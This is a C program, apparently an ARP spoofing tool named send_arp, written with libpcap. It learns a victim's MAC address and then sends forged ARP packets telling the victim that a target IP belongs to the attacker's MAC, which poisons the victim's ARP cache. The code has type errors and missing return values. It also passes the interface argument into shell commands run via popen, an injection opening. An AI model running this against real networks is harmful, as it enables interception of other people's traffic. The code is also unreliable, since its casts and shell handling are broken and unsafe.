#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <pcap.h>
#include <libnet.h>
#include <stdint.h>

#define BUFSIZE 1024

#pragma pack(push,1)
typedef struct Packet{
    uint8_t DesMac[6];
    uint8_t SrcMac[6];
    uint16_t Type;
    uint16_t HardwareT;
    uint16_t ProtocolT;
    uint8_t HardwareLen;
    uint8_t ProtocolLen;
    uint16_t Operation;
    uint8_t SenHardAdd[6];
    uint32_t SenIP;
    uint8_t TarHardAdd[6];
    uint32_t TarIP;
}P;
#pragma pack(pop)

struct ether_addr my_Mac;
struct sockaddr_in my_IP;

int getIP(char *dev){
    FILE* ptr;
    char cmd[300] = {0x0};
    char ip[21] = {0,};
    sprintf(cmd,"ifconfig | egrep 'inet addr:' | awk '{print $2}'",dev);
    ptr = popen(cmd,"r");
    fgets(ip,sizeof(ip),ptr);
    pclose(ptr);
    inet_aton(ip+5,&my_IP.sin_addr);
}

int get_mac(char *dev){
    FILE* ptr;
    char cmd[300] = {0x0};
    char Mac[20] = {0x0};
    sprintf(cmd,"ifconfig | grep HWaddr | grep %s | awk '{print $5}'",dev);
    ptr = popen(cmd,"r");
    fgets(Mac,sizeof(Mac),ptr);
    pclose(ptr);
    ether_aton_r(Mac,&my_Mac);

    return 0;
}

void PrintError(P errorP){
    uint8_t pub_packet[42] = {0,};

    memcpy(pub_packet, &errorP, 42);
    printf("Error \n");
    printf("Look your packet : ");
    for(int i =0; i< 42; i ++) printf("%02x ",pub_packet[i]);
    printf("\n");
}

int pub_struct(P* pub_P){
    for(int i =0; i<6; i++) pub_P->SrcMac[i] =  my_Mac.ether_addr_octet[i];
    for(int i =0; i<6; i++) pub_P->SenHardAdd[i] =  my_Mac.ether_addr_octet[i];
    pub_P->Type = htons(0x0806);
    pub_P->HardwareT = htons(0x0001);
    pub_P->ProtocolT = htons(0x0800);
    pub_P->HardwareLen = 0x06;
    pub_P->ProtocolLen = 0x04;
}

int send_arp(pcap_t *handle, uint32_t* Send_IP, uint32_t* Tar_IP, uint32_t* MyIP){
    uint32_t bufsize;
    P sendReq;

    pub_struct(&sendReq);
    for(int i =0; i<6; i++) sendReq.DesMac[i] = 0xff;
    for(int i =0; i<6; i++) sendReq.TarHardAdd[i] = 0x00;
    sendReq.Operation = htons(0x0001);
    sendReq.SenIP = (uint32_t &)MyIP;
    sendReq.TarIP = (uint32_t &)Send_IP;

    if(pcap_sendpacket(handle,(u_char*)(&sendReq),sizeof(sendReq)) == -1){
        PrintError(sendReq);
        exit(1);
    }}

int rep_packet(pcap_t *handle, const u_char *packet , char *dev, uint32_t* Send_IP, uint32_t* Tar_IP){
    P *rep;
    P Re_send;
    rep = (P*)packet;
    uint8_t mac[6];

    if(ntohs(rep -> Type) == 0x0806){
        if(ntohs(rep -> Operation) == 0x0002){
            if(rep ->SenIP == (uint32_t &)Send_IP){
                pub_struct(&Re_send);
                for(int i =0; i<6; i++) mac[i] = rep -> SrcMac[i];
                for(int i =0; i<6; i++) Re_send.DesMac[i] = mac[i];
                for(int i =0; i<6; i++) Re_send.TarHardAdd[i] = mac[i];
                Re_send.Operation = htons(0x0001);
                Re_send.SenIP = (uint32_t &)Tar_IP;
                Re_send.TarIP = (uint32_t &)Send_IP;

                if(pcap_sendpacket(handle,(u_char*)(&Re_send),sizeof(Re_send)) == -1) {
                    PrintError(Re_send);
                    exit(1);
                } } } } }

int main(int argc, char *argv[]){

    if(argc != 4){
        printf("That 's wrong!\n");
        printf("EX)./send_arp (interface) (senderIP) (targetIP) \n");
        exit(1);
    }
    struct sockaddr_in sip;
    struct sockaddr_in tip;
    char errbuf[PCAP_ERRBUF_SIZE];
    char* dev = argv[1];
    uint32_t *Send_IP;
    uint32_t *Tar_IP;
    uint32_t *MyIP;
    struct pcap_pkthdr* header;
    const u_char* packet;

    inet_aton(argv[2],&sip.sin_addr);
    memcpy(&Send_IP, &sip.sin_addr, sizeof(uint32_t));
    inet_aton(argv[3],&tip.sin_addr);
    memcpy(&Tar_IP, &tip.sin_addr, sizeof(uint32_t));

    pcap_t* handle = pcap_open_live(dev, BUFSIZE, 1, 1000, errbuf);
    if (handle == NULL){
        printf("%s : %s \n", dev, errbuf);
        exit(1);
    }
    get_mac(dev);
    if (getIP(dev) > 0){
        memcpy(&MyIP, &my_IP.sin_addr, sizeof(uint32_t));
    }

    send_arp(handle, Send_IP, Tar_IP, MyIP);

    while(1){
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) exit(1);
        rep_packet(handle, packet, dev, Send_IP, Tar_IP);
    }
    return 0;
}

